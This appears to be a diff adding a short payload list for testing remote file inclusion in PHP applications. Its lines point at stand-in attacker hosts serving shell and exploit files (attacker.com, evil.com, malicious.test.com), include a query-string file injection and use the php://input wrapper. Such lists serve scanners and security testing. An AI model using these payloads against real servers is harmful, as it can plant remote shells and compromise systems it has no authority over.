@@ -1,0 +1,5 @@
+http://attacker.com/shell.txt
+http://evil.com/shell.php
+http://example.com/index.html?
+?file=http://malicious.test.com/exploit.txt
+php://input
